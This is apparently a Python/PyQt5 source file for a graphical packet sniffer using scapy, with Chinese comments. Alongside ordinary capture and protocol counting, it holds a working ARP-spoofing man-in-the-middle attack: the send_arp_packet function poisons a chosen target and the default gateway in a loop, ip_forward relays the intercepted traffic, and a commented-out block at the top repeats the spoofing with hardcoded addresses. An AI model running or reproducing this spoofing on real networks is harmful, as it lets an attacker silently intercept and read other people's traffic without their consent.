from PyQt5.QtCore import pyqtProperty, QCoreApplication, QObject, QUrl, pyqtSignal, pyqtSlot
from PyQt5.QtQml import qmlRegisterType, QQmlComponent, QQmlEngine
from PyQt5 import QtCore, QtGui, QtWidgets, QtQml,QtQuick
from PyQt5.QtQuick import QQuickView, QQuickItem
import socket
import fcntl
import struct
from scapy.all import *
import threading
import datetime
import PacketItemModel
import HTTPParser
import time

'''
interface = "Intel(R) Dual Band Wireless-AC 3160"
tip = "10.12.199.149"
gip = "10.12.223.254"
localmac=get_if_hwaddr(interface)
tmac=getmacbyip(tip)
gmac=getmacbyip(gip)
ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)
pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)
try:
   while 1:
        sendp(ptarget,inter=2,iface=interface)
        sendp(pgateway,inter=2,iface=interface)
        print("test")
except KeyboardInterrupt:
'''
IFACE = 'wlp8s0'   #网卡名称
STOP = True      #停止嗅探
PACKETS = []     #数据包收集序列
SELECT_ROW = 0   #选择的行
SELECT_INFO = '' #选择行的详细信息
SHOW2STR = ''   #show2()显示的字符串
HEXSTR = ''     #hex()显示的信息
FILTER = None   #过滤规则
PACKET_NUM = 0
STARTED = False
TARGET_IP = ""
ARP_TABLE = dict()

class Interfaces(QObject):
        #获取网卡名称
    def get_iface_name(self):
        with open('/proc/net/dev') as f:
            net_dump = f.readlines()
        device_data = {}
        for line in net_dump[2:]:
            line = line.split(':')
            device_data[line[0].strip()] = format(float(line[1].split()[0])/(1024.0*1024.0), '0.2f') + " MB;" + format(float(line[1].split()[8])/(1024.0*1024.0), '0.2f') + " MB"
        return device_data

    def __init__(self, parent=None):
        super().__init__(parent)
        self._interfaceList = list(self.get_iface_name().keys())

    @pyqtSlot(result=list)
    def interfaceList(self):
        return self._interfaceList

    @pyqtSlot('int')
    def selected(self, result):
        return
        global IFACE
        IFACE = self._interfaceList[result]

    addElement = pyqtSignal(str, str)   #you call it like this  - addElement.emit("name", "value")

class Sniffer(QObject):
    newPacketCatched = pyqtSignal(str, str, str, str, str, str, str,
                arguments = ["number", "time","sourceip","destip","procotol","lenth","info"])
    hexChanged = pyqtSignal(str, arguments = ["hex"])
    packetItemModel = PacketItemModel.TreeModel()
    filterSelected = pyqtSignal(str, arguments = ["pattern"])
    updateCount = pyqtSignal(int, int, int, int, int, int, int, int,
                             arguments = ['total', 'ipv4', 'ipv6', 'tcp', 'udp', 'arp', 'http', 'icmp'])
    def __init__(self, parent=None):
        super().__init__(parent)
        self._filterList = ['','TCP', 'UDP', 'ARP', 'ICMP','HTTP', 'IPV6']
        self._selectedPacket = None

        #统计数据
        self.ipv4_count = 0
        self.ipv6_count = 0
        self.tcp_count = 0
        self.udp_count = 0
        self.arp_count = 0
        self.http_count = 0
        self.icmp_count = 0

    
    @pyqtSlot(result=list)
    def filterList(self):
        return self._filterList
    
    @pyqtSlot('int')
    def selectFilter(self, index):
        print(index)
        self.filterSelected.emit(self._filterList[index])

    @pyqtSlot('int')
    def selectPacket(self, index):
        global PACKETS
        self._selectedPacket = PACKETS[index]
        self.packetItemModel.setPacket(self._selectedPacket)
        self.hexChanged.emit(hexdump(self._selectedPacket, True))
        
    #处理数据包
    def handle_packets(self, packet):
        global STOP
        if STOP:
            print("stop sniff")
            return
        nowTime=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        global PACKET_NUM
        PACKET_NUM += 1
        lenth = len(packet)
        ip_forward(packet)
        if int(packet.getlayer(Ether).type) == 34525:
            self.ipv6_count += 1
            proto = 'IPv6'
            src = str(packet.getlayer(IPv6).src)
            dst = str(packet.getlayer(IPv6).dst)
            info = str(packet.summary())
            self.newPacketCatched.emit(str(PACKET_NUM), nowTime, src, dst, proto, str(lenth), info)
            PACKETS.append(packet)
        elif int(packet.getlayer(Ether).type) == 2048:
            self.ipv4_count+=1
            src = str(packet.getlayer(IP).src)
            dst = str(packet.getlayer(IP).dst)
            info = str(packet.summary())
            proto = ''
            if int(packet.getlayer(IP).proto) == 6:
                self.tcp_count += 1
                proto = 'TCP'
                if packet.haslayer(TCP):
                    if HTTPParser.isHTTP(packet):
                        self.http_count += 1
                        proto = 'HTTP'
                        info = HTTPParser.generateInfo(packet)
            elif int(packet.getlayer(IP).proto) == 17:
                proto = 'UDP'
                self.udp_count += 1
            elif int(packet.getlayer(IP).proto) == 1:
                proto = 'ICMP'
                self.icmp_count += 1
            self.newPacketCatched.emit(str(PACKET_NUM), nowTime, src, dst, proto, str(lenth), info)
            PACKETS.append(packet)
        elif int(packet.getlayer(Ether).type) == 2054:
            proto = 'ARP'
            self.arp_count += 1
            src = str(packet.getlayer(ARP).psrc)
            dst = str(packet.getlayer(ARP).pdst)
            info = str(packet.summary())
            #self.packet_table.row_append(src, dst, proto, info)
            self.newPacketCatched.emit(str(PACKET_NUM), nowTime, src, dst, proto, str(lenth), info)
            PACKETS.append(packet)
        self.updateCount.emit(PACKET_NUM, self.ipv4_count, self.ipv6_count, self.tcp_count, self.udp_count,
                              self.arp_count, self.http_count, self.icmp_count)

    @pyqtSlot()
    def save_pdf(self):
        save_name = QtWidgets.QFileDialog.getSaveFileName(None, self.tr("Save PDF"), '.', self.tr("Packets Files(*.pdf)"))
        if save_name:
            name = str(save_name[0] + '.pdf')
            self._selectedPacket.pdfdump(name)
            QtWidgets.QMessageBox.information(None, u"保存成功", self.tr("PDF保存成功!"))

    @pyqtSlot()
    def save_pcap(self):
        if self._selectedPacket is None:
            return
        global PACKETS
        save_name = QtWidgets.QFileDialog.getSaveFileName(None, self.tr("Save Packets"), '.', self.tr("Packets Files(*.pcap)"))
        if save_name:
            print(save_name)
            name = str(save_name[0] + '.pcap')
            wrpcap(name, self._selectedPacket)
            QtWidgets.QMessageBox.information(None, u"保存成功", self.tr("数据包保存成功!"))

    @pyqtSlot('QString')
    def start_sniff(self, targetIP):
        global TARGET_IP
        TARGET_IP = targetIP
        global STOP
        STOP = False
        global STARTED
        if targetIP is not "":
            arp_thread = threading.Thread(target=send_arp_packet, args=([targetIP]))
            arp_thread.start()

        if STARTED:
            return
        else:
            STARTED = True
        sniff_thread = threading.Thread(target=sniffer, args=(IFACE, self.handle_packets))
        sniff_thread.start()


    #停止嗅探
    @pyqtSlot()
    def stop_sniff(self):
        global STOP
        STOP = True

    #重新开始
    def restart_sniff(self):
        global STOP
        STOP = False
        pass

    #过滤数据包
    def filter_pcap(self):
        global FILTER
        pass

#获取网卡IP地址
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])

#嗅探
def sniffer(IFACE, handle):
    sniff(iface=str(IFACE), prn=handle)

def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def send_arp_packet(ip):
    global STOP
    interface = IFACE
    tip = ip
    gip = get_default_gateway_linux()
    localmac=get_if_hwaddr(interface)
    tmac=getmacbyip(tip)
    gmac=getmacbyip(gip)

    ARP_TABLE[tip] = tmac
    ARP_TABLE[gip] = gmac
    ARP_TABLE['local_mac'] = localmac

    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)
    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)
    while not STOP:
        sendp(ptarget,inter = 0.5, iface=interface)
        sendp(pgateway,inter = 0.5,iface=interface)
        print("ARP->" + tip)

def ip_forward(pkt):
    global TARGET_IP
    if TARGET_IP is '':
        return
    if not pkt.haslayer(IP):
        return
    localmac = ARP_TABLE['local_mac']
    src_mac = pkt.getlayer(Ether).src
    dst_mac = pkt.getlayer(Ether).dst
    if dst_mac == localmac:
        print("Ip forward")
        src_ip = pkt.getlayer(IP).src
        dst_ip = pkt.getlayer(IP).dst
        print(dst_ip)
        if dst_ip == TARGET_IP:
            print(src_ip+"->"+dst_ip)
            pkt[Ether].dst = ARP_TABLE[dst_ip]
            print("mac is" + ARP_TABLE[dst_ip])
            sendp(pkt,iface=IFACE)
            pass
        elif dst_ip == get_default_gateway_linux():
            print(src_ip + "->" + dst_ip)
            pkt[Ether].dst = ARP_TABLE[dst_ip]
            sendp(pkt,iface=IFACE)
            pass


def main():
    app = QtWidgets.QApplication(sys.argv)
    app.setFont(QtGui.QFont("Ubuntu Mono"))
    engine = QtQml.QQmlApplicationEngine()
    interfaces = Interfaces()
    engine.rootContext().setContextProperty('interfaces', interfaces)
    sniffer = Sniffer()
    engine.rootContext().setContextProperty('sniffer', sniffer)

    packetItemModel = sniffer.packetItemModel
    engine.rootContext().setContextProperty('packetItemModel', packetItemModel)
    engine.load(QUrl('main.qml'))

    topLevel = QtCore.QObject()  
    topLevel = engine.rootObjects()[0]  
    
    window = QtQuick.QQuickWindow()  
    window = topLevel  
    
    window.show()
    sys.exit(app.exec_())  

if __name__ == '__main__':
    main()